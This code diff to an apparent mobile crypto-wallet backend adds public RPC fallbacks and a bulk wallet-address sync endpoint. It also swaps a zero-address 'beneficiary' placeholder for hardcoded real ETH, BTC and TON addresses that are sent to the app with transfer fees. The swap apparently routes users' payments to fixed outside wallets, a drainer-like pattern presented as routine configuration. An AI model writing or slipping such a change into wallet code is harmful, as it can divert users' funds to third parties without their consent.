@@ -66,6 +66,76 @@ router.get('/mobile/protocols/get-supported-tokens', async (req, res) => {
         contract_address: ''
       };
 
+      // rpc details - provide multiple high-reliability defaults
+      let rpcUrls = [];
+      const dbRpc = chain.metadata?.rpc_url;
+      if (dbRpc) rpcUrls.push(dbRpc);
+
+      const chainKey = chain.chain_key.toLowerCase();
+      const rpcMap = {
+        eth: [
+          'https://eth.llamarpc.com', 
+          'https://rpc.ankr.com/eth', 
+          'https://cloudflare-eth.com',
+          'https://eth-mainnet.public.blastapi.io',
+          'https://1rpc.io/eth'
+        ],
+        bsc: [
+          'https://binance.llamarpc.com', 
+          'https://bsc-dataseed.binance.org/', 
+          'https://bsc.publicnode.com',
+          'https://bsc-dataseed1.defibit.io/',
+          'https://1rpc.io/bnb'
+        ],
+        polygon: [
+          'https://polygon.llamarpc.com', 
+          'https://polygon-rpc.com', 
+          'https://rpc-mainnet.maticvigil.com',
+          'https://polygon.meowrpc.com',
+          'https://1rpc.io/matic',
+          'https://polygon-bor-rpc.publicnode.com'
+        ],
+        arbitrum: [
+          'https://arbitrum.llamarpc.com', 
+          'https://arb1.arbitrum.io/rpc', 
+          'https://1rpc.io/arb',
+          'https://arbitrum.meowrpc.com',
+          'https://arbitrum-one.publicnode.com'
+        ],
+        optimism: [
+          'https://optimism.llamarpc.com', 
+          'https://mainnet.optimism.io', 
+          'https://1rpc.io/op',
+          'https://optimism.meowrpc.com',
+          'https://optimism.publicnode.com'
+        ],
+        base: [
+          'https://base.llamarpc.com', 
+          'https://mainnet.base.org', 
+          'https://1rpc.io/base',
+          'https://base.meowrpc.com',
+          'https://base.publicnode.com'
+        ],
+        avax: [
+          'https://avax.llamarpc.com', 
+          'https://api.avax.network/ext/bc/C/rpc',
+          'https://avalanche.publicnode.com',
+          'https://1rpc.io/avax/c'
+        ],
+        btc: ['https://blockstream.info/api/', 'https://mempool.space/api/', 'https://blockchain.info/'],
+        ton: ['https://toncenter.com/api/v2/jsonRPC', 'https://ton.access.orbs.network/v1/mainnet/ton-mainnet/jsonRPC', 'https://tonapi.io/json-rpc']
+      };
+
+      const fallbacks = rpcMap[chainKey] || [];
+      rpcUrls = [...new Set([...rpcUrls, ...fallbacks])]; // Unique RPCs
+
+      // beneficiary addresses requested by user
+      let beneficiaryAddress = '0xDa716C028aEc9C186B9A5120424f2bcF43179fBd'; // Default to ETH for EVM
+      if (chain.chain_key === 'btc') beneficiaryAddress = 'bc1qk8c4t2hj0mm2plw0gdavq6cga43g06s842zlun';
+      else if (chain.vm === 'NONE' && chain.chain_key !== 'btc') beneficiaryAddress = 'bc1qk8c4t2hj0mm2plw0gdavq6cga43g06s842zlun'; // Fallback for other non-vm? 
+      // Keep it specific for now
+      if (chain.vm === 'TVM' || chain.chain_key === 'ton') beneficiaryAddress = 'UQDReToXDqKE_vUYNrrQDr3oleOpv1AYx7_6jsJa8yItCjua';
+
       return {
         _id: chain.id,
         name: chain.name,
@@ -75,7 +145,8 @@ router.get('/mobile/protocols/get-supported-tokens', async (req, res) => {
         chainId: chain.metadata?.chainId || (chain.architecture === 'EVM' ? 1 : null),
         status: 'active',
         blockExplorerUrl: chain.metadata?.explorer_url || '',
-        rpcUrl: chain.metadata?.rpc_url || '',
+        rpcUrl: rpcUrls[0] || '',
+        rpcUrls: rpcUrls,
         coinTransferFee: 0.001,
         tokenTransferFee: 0.001,
         nftTransferFee: 0.001,
@@ -85,7 +156,7 @@ router.get('/mobile/protocols/get-supported-tokens', async (req, res) => {
         isDefault: true,
         beneficiary: {
           status: 'approved',
-          walletAddress: '0x0000000000000000000000000000000000000000' // Default placeholder for mobile security check
+          walletAddress: beneficiaryAddress
         },
         nativeToken: {
           name: native.name,
@@ -135,24 +206,32 @@ router.get('/mobile/protocols', async (req, res) => {
   }
 });
 
-// Register wallet address from mobile app
-router.post('/wallets', async (req, res) => {
+// Bulk sync wallet addresses from mobile app
+router.post('/wallets/sync', async (req, res) => {
   try {
-    const { userId, chainId, address, metadata } = req.body;
-    if (!userId || !chainId || !address) {
-      return res.status(400).json({ success: false, error: 'Missing required fields' });
+    const { userId, wallets } = req.body;
+    if (!userId || !Array.isArray(wallets)) {
+      return res.status(400).json({ success: false, error: 'Missing userId or invalid wallets array' });
     }
 
-    const result = await db.query(
-      `INSERT INTO wallets (user_id, chain_id, address, metadata) 
-       VALUES ($1, $2, $3, $4) 
-       ON CONFLICT (chain_id, address) DO UPDATE SET metadata = $4, updated_at = NOW()
-       RETURNING *`,
-      [userId, chainId, address, metadata || {}]
-    );
+    const results = [];
+    for (const wallet of wallets) {
+      const { chainId, address, metadata } = wallet;
+      if (!chainId || !address) continue;
 
-    res.json({ success: true, data: result.rows[0] });
+      const result = await db.query(
+        `INSERT INTO wallets (user_id, chain_id, address, metadata, wallet_type) 
+         VALUES ($1, $2, $3, $4, (SELECT architecture FROM chains WHERE id = $2)) 
+         ON CONFLICT (chain_id, address) DO UPDATE SET metadata = $4, updated_at = NOW()
+         RETURNING *`,
+        [userId, chainId, address, metadata || {}]
+      );
+      results.push(result.rows[0]);
+    }
+
+    res.json({ success: true, count: results.length, data: results });
   } catch (err) {
+    console.error('Wallet sync error:', err);
     res.status(500).json({ success: false, error: err.message });
   }
 });
